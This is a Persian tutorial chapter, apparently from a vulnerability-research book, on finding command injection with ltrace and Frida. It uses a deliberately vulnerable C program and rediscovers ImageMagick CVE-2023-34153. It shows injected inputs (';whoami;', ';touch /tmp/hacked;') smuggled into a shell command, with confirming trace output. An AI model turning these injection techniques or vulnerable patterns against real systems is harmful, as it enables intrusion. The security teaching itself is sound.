برای تمرین تحلیل پویا، آسیب‌پذیری تزریق فرمان با شناسه **CVE-2023-34153** را در کتابخانه مشهور **ImageMagick** بازکشف خواهیم کرد. در لینوکس، ایمیج‌مجیک به صورت یک فایل **AppImage** توزیع می‌شود؛ فایلی مستقل که شامل یک سیستم‌فایل فشرده به همراه تمامی کتابخانه‌های مورد نیاز است. نگارش آسیب‌پذیر 7.1.1-9 را دانلود و از حالت فشرده خارج می‌کنیم:

\`\`\`bash
$ chmod +x ImageMagick--gcc-x86_64.AppImage
$ ./ImageMagick--gcc-x86_64.AppImage --appimage-extract
\`\`\`

این دستور پوشه \`squashfs-root\` را در شاخه جاری ایجاد می‌کند که شامل باینری هدف \`magick\` و وابستگی‌های آن است.

---

### ردگیری فراخوانی‌های کتابخانه‌ای و سیستمی با ltrace

تقریباً هر نرم‌افزاری ناچار است توابع کتابخانه‌های اشتراکی را فراخوانی کند. با رهگیری این فراخوانی‌ها، بینش بسیار عمیقی از کارکرد درونی برنامه حاصل می‌شود. برای باینری‌های پیوند پویا، می‌توان این فراخوانی‌ها را با ابزار **\`ltrace\`** به دام انداخت.

ابزار \`ltrace\` با کاشتن بریک‌پوینت‌های نرم‌افزاری بر روی استاب‌های فراخوانی در جداول PLT، فراخوانی‌ها و آرگومان‌های ارسالی به توابع کتابخانه‌ای را ثبت و لاگ می‌کند. برای درک ملموس این ابزار، برنامه نمونه \`hello-vuln.c\` در فهرست ۵-۳ را در نظر بگیرید:

\`\`\`c
// hello-vuln.c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    char name[30];
    char command[100];
    printf("Enter your name: ");
    scanf("%s", name);
    snprintf(command, sizeof(command), "echo Hello, %s", name);
    int result = system(command);
    return result;
}
\`\`\`

*فهرست ۵-۳: یک برنامه آسیب‌پذیر نمونه به زبان C*

این برنامه ورودی کاربر را بدون بررسی دریافت کرده و به تابع سیستمی \`system\` پاس می‌دهد. با کامپایل و اجرای آن:

\`\`\`bash
$ gcc -o hello-vuln hello-vuln.c
$ ./hello-vuln
Enter your name: Raccoon
Hello, Raccoon
$ ./hello-vuln
Enter your name: ;whoami;
Hello, 
kali
\`\`\`

چگونه با تحلیل پویا این آسیب‌پذیری را شکار کنیم؟ اجرای \`ltrace\` بر روی باینری با یک ورودی متمایز موسوم به **رشته قناری (Canary String)** نظیر \`canary123\`:

\`\`\`bash
$ ltrace ./hello-vuln >/dev/null
printf("Enter your name: ") = 17
canary123
__isoc99_scanf(0x55663b7f3016, 0x7fff69c19ad0, 0, 0) = 1
snprintf("echo Hello, canary123", 100, "echo Hello, %s", "canary123") = 21
❶ system("echo Hello, canary123" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> ) = 0
+++ exited (status 0) +++
\`\`\`

خروجی فوق آرگومان‌های واقعی و مقادیر بازگشتی توابع \`snprintf\` و \`system\` را برملا می‌کند. در یک نرم‌افزار ناشناخته، مشاهده مستقیم رشته قناری درون آرگومان تابع \`system\` ❶ بلافاصله توجه شما را به عنوان یک چاهک تزریق‌پذیر جلب می‌نماید. هرگونه دستکاری، فیلتر یا الحاق در طول مسیر مستقیماً در لاگ‌های \`ltrace\` بازتاب می‌یابد و به شما اجازه می‌دهد بای‌پس‌های گوناگون را به صورت زنده بیازمایید.

علاوه بر توابع کتابخانه‌ای، \`ltrace\` قادر است **فراخوانی‌های سیستمی (System Calls)** را نیز رصد کند. فراخوانی‌های سیستمی توسط هسته (Kernel) برای کارهای پایه‌ای نظیر ورودی/خروجی فایل و ساخت پردازه اجرا می‌شوند، در حالی که توابع کتابخانه‌ای در فضای کاربر (User Space) عمل می‌کنند.

با سوییچ \`-S\` می‌توانید فراخوانی‌های سیستمی را لاگ کرده و با سوییچ \`-f\` پردازه‌های فرزند (Child Processes) ساخته‌شده توسط \`system\` را نیز ردیابی کنید:

\`\`\`bash
$ ltrace -o ltrace.txt -f -S ./hello-vuln >/dev/null
canary
$ cat ltrace.txt
--snip--
❶ 2785318 printf("Enter your name: " <unfinished ...>
2785318 newfstatat@SYS(1, "", 0x7fffb0d03a40, 0x1000)
❷ 2785318 ioctl@SYS(1, 0x5401, 0x7fffb0d039a0, 4096)
2785318 getrandom@SYS(0x7f8c09700178, 8, 1, 4096)
2785318 brk@SYS(nil)
2785318 brk@SYS(0x56035aa78000)
❸ 2785318 <... printf resumed> )
2785318 newfstatat@SYS(0, "", 0x7fffb0d034d0, 0x1000)
2785318 read@SYS(0, "canary\\n", 1024)
2785318 <... __isoc99_scanf resumed> )
2785318 snprintf("echo Hello, canary", 100, "echo Hello, %s", "canary")
❹ 2785318 system("echo Hello, canary" <unfinished ...>
--snip--
2785360 execve@SYS("/bin/sh", 0x7fffb0d03a70, 0x7fffb0d03fa8 <no return ...>
--snip--
2785318 <... system resumed> )
\`\`\`

فراخوانی‌های سیستمی هسته با پسوند **\`@SYS\`** مشخص شده‌اند. عبارت \`<unfinished ...>\` نشان می‌دهد تابع منتظر اتمام عملیات سطح پایین‌تر است؛ برای نمونه \`printf\` ❶ برای ارسال کاراکترها ناچار است چندین فراخوانی سیستمی نظیر \`ioctl\` ❷ را روی توصیف‌گر استاندارد خروجی (۱) اجرا کند تا عملیات خاتمه یابد ❸. تابع \`system\` ❹ نیز پردازه فرزندی می‌سازد که با فراخوانی سیستمی \`execve@SYS\` مفسر \`/bin/sh\` را احضار می‌کند.

---

### تحلیل فراخوانی‌های کتابخانه‌ای در ImageMagick

اکنون این متدولوژی را روی نرم‌افزار ImageMagick پیاده می‌کنیم. باینری \`magick\` از گزینه‌ای به نام \`-define\` پشتیبانی می‌کند که امکان پیکربندی پارامترهای پیشرفته ویدیویی نظیر \`video:pixel-format\` را به کاربر می‌دهد.

یک فایل ویدیویی نمونه MOV را دانلود کرده و دستور \`ltrace\` را با تعیین حداکثر طول رشته قابل چاپ (\`-s 1024\`) و مقدار قناری \`canary123\` اجرا می‌کنیم:

\`\`\`bash
$ wget https://raw.githubusercontent.com/spaceraccoon/from-day-zero-to-zero-day/refs/heads/main/chapter-05/example.mov
$ ltrace -o ltrace.txt -f -S -s 1024 ./squashfs-root/usr/bin/magick identify -define video:pixel-format='canary123' example.mov
sh: 1: ffmpeg: not found
identify: UnableToOpenConfigureFile \`delegates.xml' @ warning/configure.c/GetConfigureOptions/722.
\`\`\`

به این پیام خطا دقت کنید: **\`sh: 1: ffmpeg: not found\`**! این خطای ساده زنگ خطر تزریق فرمان را در ذهن هر محققی به صدا درمی‌آورد، زیرا آشکار می‌سازد که ایمیج‌مجیک در حال اجرای شل (\`sh\`) برای صدا زدن برنامه کمکی \`ffmpeg\` است. با بررسی فایل لاگ:

\`\`\`text
2780743 strlen("'ffmpeg' -nostdin -loglevel error -i '/tmp/magick-NdheoaTWLtkBKDzS6DYe4cOueEjokeel' -an -f rawvideo -y -pix_fmt canary123 -vcodec webp '/tmp/magick-SQpXJBs9cwRKgJpskeuIx_L5711HIKUP'") = 182
2780743 memcpy(0x55b83e2767e8, "'ffmpeg' -nostdin -loglevel error -i '/tmp/magick-NdheoaTWLtkBKDzS6DYe4cOueEjokeel' -an -f rawvideo -y -pix_fmt canary123 -vcodec webp '/tmp/magick-SQpXJBs9cwRKgJpskeuIx_L5711HIKUP'\\0", 183) = 0x55b83e2767e8
\`\`\`

رشته قناری ما مستقیماً درون خط فرمان فراخوانی \`ffmpeg\` جاسازی شده است! اما چرا این رشته در لاگ \`ltrace\` درون توابعی نظیر \`strlen\` و \`memcpy\` دیده شد اما نامی از \`system\` یا \`popen\` برده نشد؟

با بررسی جداول نمادهای باینری \`magick\` با دستور \`objdump -Tt\`:

\`\`\`bash
$ objdump -Tt ./squashfs-root/usr/bin/magick | grep -E 'exec|system|popen'
\`\`\`

هیچ نمادی یافت نمی‌شود! دلیل این امر آن است که باینری \`magick\` مستقیماً این توابع را از کتابخانه C صدا نمی‌زند، بلکه کار را به کتابخانه هسته خود یعنی **\`libMagickCore-7.Q16HDRI.so.10.0.1\`** محول کرده است:

\`\`\`bash
$ objdump -Tt ./squashfs-root/usr/lib/libMagickCore-7.Q16HDRI.so.10.0.1 | grep -E 'exec|system|popen'
0000000000000000      DF *UND*  00000000 (GLIBC_2.2.5) popen
0000000000000000      DF *UND*  00000000 (GLIBC_2.2.5) execvp
0000000000000000      DF *UND*  00000000 (GLIBC_2.2.5) system
\`\`\`

کتابخانه اصلی \`libMagickCore\` است که تابع \`popen\` را وارد کرده است. برای اینکه \`ltrace\` بتواند فراخوانی‌های درون کتابخانه‌ها را به دام بیندازد، از سوییچ فیلتر **\`-x 'popen'\`** استفاده می‌کنیم:

\`\`\`bash
$ ltrace -x 'popen' -o ltrace.txt -f -S -s 1024 ./squashfs-root/usr/bin/magick identify -define video:pixel-format='canary123' example.mov
$ grep ffmpeg ltrace.txt
2787837 popen@libc.so.6("'ffmpeg' -nostdin -loglevel error -i '/tmp/magick-4v08z3RT252MF305Ftxn2EFudPmQuy9' -an -f rawvideo -y -pix_fmt canary123 -vcodec webp '/tmp/magick-KKDEsZhEeOqrhRYx_HDg5i2k-QEGQExO'", "r" <unfinished ...>
\`\`\`

چاهک با موفقیت شکار شد: تابع **\`popen@libc.so.6\`** مستقیماً با خط فرمان ساخته‌شده تغذیه می‌شود!

حال سناریوی اکسپلویت را با تزریق کاراکتر سمیکالن (\`;\`) برای شکستن ساختار دستور آزمایش می‌کنیم:
\`-define video:pixel-format=';touch /tmp/hacked;'\`

\`\`\`bash
$ ls /tmp/hacked
ls: cannot access '/tmp/hacked': No such file or directory
$ ltrace -o ltrace.txt -f -S -s 1024 ./squashfs-root/usr/bin/magick identify -define video:pixel-format=';touch /tmp/hacked;' example.mov
$ ls /tmp/hacked
/tmp/hacked
$ grep '/tmp/hacked' ltrace.txt
2788520 strlen("'ffmpeg' -nostdin -loglevel error -i '/tmp/magick-a8sDn71godWBu8nqXCyk6oc5Cpg3yuEx' -an -f rawvideo -y -pix_fmt ;touch /tmp/hacked; -vcodec webp ...") ❶
2788521 open("/tmp/hacked", 2369, 0666 <unfinished ...> ❷
2788521 openat@SYS(AT_FDCWD, "/tmp/hacked", 0x941, 0666)
\`\`\`

دستور تزریق‌شده در رشته فرمان قرار گرفته ❶ و با فراخوانی سیستمی \`openat@SYS\` فایل \`/tmp/hacked\` در سیستم ایجاد گردید ❷! آسیب‌پذیری تزریق فرمان با موفقیت به اثبات رسید.

---

### تجهیز پویا و قلاب‌گذاری توابع با Frida

ابزار \`ltrace\` با وجود سادگی، ابزاری منفعل است؛ تنها فراخوانی‌ها را چاپ می‌کند و نمی‌تواند حافظه را تغییر دهد. هنگامی که نیازمند رهگیری پیشرفته، اصلاح متغیرها در حافظه و دستکاری زنده جریان برنامه هستید، باید به سراغ **Frida** بروید.

فریدا یک جعبه‌ابزار قدرتمند مجهز به موتور تزریق کد جاوااسکریپت در برنامه‌های بومی است. با Frida می‌توانید مقادیر ثبات‌ها و پشته را در زمان اجرا بخوانید و بازنویسی کنید.

ابتدا ابزارهای فریدا را نصب کرده و آن را با ابزار خودکار **\`frida-trace\`** روی برنامه \`hello-vuln\` اجرا می‌کنیم:

\`\`\`bash
$ sudo pip install frida-tools
$ frida-trace -i "system" ./hello-vuln ❶
Instrumenting...
system: Auto-generated handler at "/home/kali/Desktop/hello-vuln/__handlers__/libc.so.6/system.js" ❷
Enter your name: Started tracing 1 function. Press Ctrl+C to stop.
canary123
Hello, canary123
/* TID 0xd8e1a */
4138 ms  system(command="echo Hello, canary123") ❸
Process terminated
\`\`\`

ابزار \`frida-trace\` به طور خودکار تابعی به نام \`system\` را در فرآیند شناسایی کرده ❶ و یک هندلر جاوااسکریپت برای آن ایجاد و تزریق می‌نماید ❷ و به محض فراخوانی، آرگومان آن را ثبت می‌کند ❸.

با نگاهی به فایل تولیدشده \`system.js\`:

\`\`\`javascript
{
  onEnter(log, args, state) {
    log(\`system(command="\${args[0].readUtf8String()}")\`);
  },
  onLeave(log, retval, state) {
  }
}
\`\`\`

هندلر \`onEnter\` پیش از اجرای تابع فعال شده و آرگومان اول (\`args[0]\`) را به عنوان رشته UTF-8 می‌خواند. هندلر \`onLeave\` نیز پس از بازگشت از تابع فعال می‌شود که می‌توانید مقدار بازگشتی \`retval\` را در آن لاگ کنید.

#### دستکاری پویای حافظه در زمان اجرا

قابلیت مرگبار و تعیین‌کننده فریدا، توانایی **تغییر حافظه در زمان اجرا (Runtime Memory Manipulation)** است. در فهرست ۵-۴، اسکریپت را طوری تغییر می‌دهیم که آرگومان ارسالی به تابع \`system\` را در حافظه بازنویسی کند:

\`\`\`javascript
{
  onEnter(log, args, state) {
    log(\`system(command="\${args[0].readUtf8String()}")\`);
❶   args[0].writeUtf8String('modified argument!');
    log(\`system(command="\${args[0].readUtf8String()}")\`);
  },
  onLeave(log, retval, state) {
    log(\`system returned \${retval}\`);
  }
}
\`\`\`

*فهرست ۵-۴: اسکریپت اصلاح‌شده برای دستکاری آرگومان در حافظه*

با اجرای مجدد برنامه:

\`\`\`bash
$ frida-trace -i "system" ./hello-vuln
Enter your name: asd
sh: 1: modified: not found
/* TID 0x13e92 */
679 ms  system(command="echo Hello, asd") ❶
679 ms  system(command="modified argument!") ❷
680 ms  system returned 0x7f00
\`\`\`

اگرچه ورودی استاندارد \`asd\` بود ❶، اما به لطف فریدا مقدار موجود در پوینتر حافظه با عبارت \`modified argument!\` جایگزین شد و همان اجرا گردید ❷! این قابلیت در مهندسی معکوس برای دور زدن توابع اعتبارسنجی (Bypassing Validation)، دور زدن روت و جیلبریک و شکستن Certificate Pinning کاربرد بی‌نظیری دارد.

#### اسکریپت‌نویسی پیشرفته با پایتون و Frida

برای تحلیل‌های عمیق‌تر، نوشتن اسکریپت‌های پایتون با کلاینت فریدا رویکردی استاندارد و خودکارپذیر است. فهرست ۵-۵ اسکریپت کاملی را برای رهگیری تابع \`popen\` با استفاده از معماری ناهمگام Reactor نشان می‌دهد:

\`\`\`python
# hook.py
import threading
from frida_tools.application import Reactor
import frida
import sys

SCRIPT = """
Interceptor.attach(Module.getExportByName(null, 'popen'), {
  onEnter: function (args) {
    send({
      function: 'popen',
      command: Memory.readUtf8String(args[0]),
    });
  }
});
"""

class Application:
    def __init__(self, argv, script):
        self._argv = argv
        self._script = script
        self._stop_requested = threading.Event()
        self._reactor = Reactor(run_until_return=lambda reactor: self._stop_requested.wait())

    def run(self):
        self._reactor.schedule(lambda: self._start())
        self._reactor.run()

    def _start(self):
❶       pid = frida.spawn(self._argv)
❷       session = frida.attach(pid)
        session.on("detached", lambda reason: self._reactor.schedule(lambda: self._on_detached(pid, session, reason)))
❸       script = session.create_script(self._script)
        script.on("message", self._on_message)
        script.load()
        frida.resume(pid)

    def _on_message(self, message, data):
        print(message)

    def _stop_if_idle(self):
        self._stop_requested.set()

    def _on_detached(self, pid, session, reason):
        self._reactor.schedule(self._stop_if_idle, delay=0.5)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python hook.py <command>")
        exit(1)
    app = Application(sys.argv[1:], SCRIPT)
    app.run()
\`\`\`

*فهرست ۵-۵: اسکریپت کامل پایتون برای قلاب‌گذاری popen با فریدا*

این اسکریپت با پایتون پردازه هدف را احضار کرده ❶، فریدا را به آن متصل می‌کند ❷، اسکریپت جاوااسکریپت تزریقی را لود می‌نماید ❸ و با آبجکت \`Interceptor.attach\` تابع \`popen\` را در زمان اجرا شکار می‌کند:

\`\`\`bash
$ python hook.py ./magick identify -define video:pixel-format='canary' example.mov
{'type': 'send', 'payload': {'function': 'popen', 'command': "'ffmpeg' -nostdin -loglevel error -i '/tmp/magick-tpq_LLF5K9ppQWPyQrtdqXJTjBrgdrRY' -an -f rawvideo -y -pix_fmt canary -vcodec webp '/tmp/magick-pUw1gC4Rwp-8I07w6JbbAJiFkLvD7tv9'"}}
sh: 1: ffmpeg: not found
identify: UnableToOpenConfigureFile \`delegates.xml' @ warning/configure.c/GetConfigureOptions/722.
\`\`\`

خروجی ساختاریافته و تمیز بالا نشان می‌دهد که چگونه یک اسکریپت سبک پایتونی می‌تواند باینری‌های پیچیده را مهار کند.

---

### پایش رویدادهای سطح بالاتر (Monitoring Higher-Level Events)

گاهی اوقات ردگیری توابع یا فراخوانی‌های سیستمی آن‌قدر ریزدانه (Granular) و حجیم است که تحلیل‌گر در دریایی از میلیون‌ها لاگ غرق می‌شود. در چنین شرایطی، می‌توان به **پایش رویدادهای سطح بالاتر (Higher-Level Events)** روی آورد:
- **رویدادهای فایل‌سیستم:** پایش باز شدن، خواندن، نوشتن و حذف فایل‌ها در سیستم‌عامل.
- **رویدادهای شبکه:** رصد اتصالات سوکت TCP/UDP، درخواست‌های DNS و ترافیک وب (HTTP/HTTPS) با ابزارهایی نظیر Wireshark یا پروکسی‌های Burp Suite و mitmproxy.
- **رویدادهای ارتباط بین‌پردازه‌ای (IPC):** گوش فرادادن به پیام‌های D-Bus در لینوکس یا رخدادهای COM/RPC در ویندوز.

---

### سنجش اکسپلویت‌پذیری (Evaluating Exploitability)

پس از کشف مسیر میان منبع و چاهک، باید اثبات کنید که این مسیر واقعاً **قابل اکسپلویت (Exploitable)** است. آیا فیلترها، توابع اعتبارسنجی یا محدودیت‌های انکودینگ در میانه راه وجود دارند که پی‌لود شما را خنثی کنند؟

در مهندسی معکوس، این کار شبیه **پرنده‌نگری در جنگلی انبوه و مه‌آلود** است. اگر بخت با شما یار باشد، گاه‌گاهی سایه‌ای واضح از پرنده هدف را میان شاخسار درختان خواهید دید؛ اما اغلب اوقات تارگت در پشت انبوه شاخه‌ها پنهان است. شما با شنیدن صدای بال زدن یا خش‌خش برگ‌ها جهت حرکت آن را حدس می‌زنید. در باینری‌ها نیز باید به نشانه‌ها و سیگنال‌های جانبی توجه کنید.

#### ۱. تحلیل پیام‌های خطا (Analyzing Errors)

پیام خطای \`sh: 1: ffmpeg: not found\` به ما گفت که ایمیج‌مجیک در خط ۱ فرمان شل در حال اجرای دستور \`ffmpeg\` است. خطاهای زمان اجرا و ارورهای Assert بهترین راهنما هستند، چرا که هنگام وقوع رخدادی نامنتظره شلیک می‌شوند و غالباً نام فایل سورس و شماره سطر کد اصلی را افشا می‌کنند.

برای نمونه، با بررسی کدهای پیرامون \`popen\` در کتابخانه \`libMagickCore\` درون گیدرا، به تابع پرتاب استثنای زیر برمی‌خوریم:

\`\`\`c
if ((param_4 == (char *)0x0) || (*param_4 == '\\0')) {
  ThrowMagickException(
    param_5,
    "MagickCore/delegate.c",
    "ExternalDelegateCommand",
    0x208,
    0x19f,
    "FailedToExecuteCommand",
    "\`%s\\' (%d)",
    local_1040,
    local_106c
  );
}
\`\`\`

تابع \`ThrowMagickException\` نام دقیق فایل سورس (\`MagickCore/delegate.c\`) و نام تابع اصلی (\`ExternalDelegateCommand\`) را برای ما فاش می‌سازد! این متادیتا فوراً زمینه و هدف تابع را روشن می‌کند.

#### ۲. استفاده از رشته‌های قناری و تحلیل فیلترها

در همان تابع \`ExternalDelegateCommand\` در گیدرا، اگر مسیر داده را به عقب دنبال کنید، می‌بینید که رشته فرمان از تابعی به نام **\`SanitizeString\`** عبور داده می‌شود:

\`\`\`c
char * SanitizeString(undefined8 param_1)
{
  char *__s;
  size_t sVar1;
  size_t sVar2;
  char *local_20;
  
  __s = (char *)AcquireString(param_1);
  sVar1 = strlen(__s);
❶ sVar2 = strspn(__s, allowedCharacters);
  for (local_20 = __s + sVar2; local_20 != __s + sVar1; local_20 = local_20 + sVar2) {
❷   *local_20 = '_';
    sVar2 = strspn(local_20,allowedCharacters);
  }
  return __s;
}
\`\`\`

این تابع با استفاده از \`strspn\` کاراکترهای رشته را با لیست سفید کاراکترهای مجاز (\`allowedCharacters\`) مقایسه کرده ❶ و هر کاراکتر غیرمجازی را با آندرلاین (\`_\`) جایگزین می‌کند ❷! این کشف ایستای مهم توضیح می‌دهد که چرا برخی پی‌لودها خنثی می‌شوند و به شما نشان می‌دهد که چه کاراکترهایی برای دور زدن فیلتر در دسترس شما قرار دارند.

همچنین در روتر FreshTomato، وب‌سرور httpd فرامین شل را با \`syslog\` ثبت می‌کند:

\`\`\`c
snprintf(acStack_360,0x200, "openssl x509 -in /tmp/openssl/%s.crt -inform PEM -out /tmp/openssl/%s.crt -outform PEM >>/tmp/openssl/openssl.log 2>&1",param_1,param_1);
syslog(4,acStack_360);
system(acStack_360);
\`\`\`

تطبیق این رشته‌های ثابت لاگ در ابزارهای پویا، شما را مستقیماً به کدهای مصرف‌کننده ورودی کاربر در باینری متصل می‌کند.

#### ۳. بررسی آثار جانبی و ارتباطات بین‌پردازه‌ای (IPC Artifacts)

برنامه‌ها در اثر اجرای خود فایل‌های موقت، کلیدهای رجیستری و لوله‌های نام‌گذاری‌شده (Named Pipes) ایجاد می‌کنند. با بازرسی این ردپاها بدون نیاز به مهندسی معکوس طولانی می‌توان به آسیب‌پذیری رسید؛ برای مثال بررسی دسترسی فایل‌های ساخته‌شده در دایرکتوری‌های همگانی و آسیب‌پذیری‌های پیوند نمادین (Symlink Attacks). در ویندوز، ابزار **OleViewDotNet** ساخته جیمز فورشاو (James Forshaw) امکان بررسی اشیاء COM ساخته‌شده توسط برنامه‌ها را فراهم می‌سازد تا سطوح دسترسی و آسیب‌پذیری‌های ارتباطات بین‌پردازه‌ای را کشف نمایید.

---

### خلاصه و نتیجه‌گیری

در این فصل، تاکتیک‌های قدرتمند تحلیل ایستا و پویا را برای کشف منابع و چاهک‌های آسیب‌پذیر در سفت‌افزار **FreshTomato** و کتابخانه **ImageMagick** به کار بستید. با ردگیری فراخوانی‌های کتابخانه‌ای و سیستمی و بهره‌گیری از تجهیز پویای کد با Frida، مسیرهای نفوذ را از ورودی‌های کنترل‌پذیر توسط کاربر تا چاهک‌های اجرای فرمان ردیابی و اکسپلویت کردید.

هدف غایی در مهندسی معکوس درست همانند بازبینی کد منبع است: **شناسایی مسیرهای اکسپلویت‌پذیر میان منبع‌ها و چاهک‌ها**. اگر یک تابع محافظ دور یک چاهک خطرناک ورودی‌ها را به درستی پاک‌سازی می‌کند، به دنبال جاهایی بگردید که آن چاهک بدون واسطه صدا زده شده است. و اگر موانع پیش رو غیرقابل نفوذ به نظر می‌رسند، وقت گرانبهای خود را هدر ندهید و انرژی خود را روی اهداف پرثمرتر متمرکز کنید.

در این فصل تحلیل ایستا و تحلیل پویا را به صورت تفکیک‌شده به کار گرفتید. در فصل ۶، این دو جهان را با یکدیگر درآمیخته و وارد قلمرو شگفت‌انگیز **تحلیل ترکیبی (Hybrid Analysis)** خواهیم شد!
`,
};
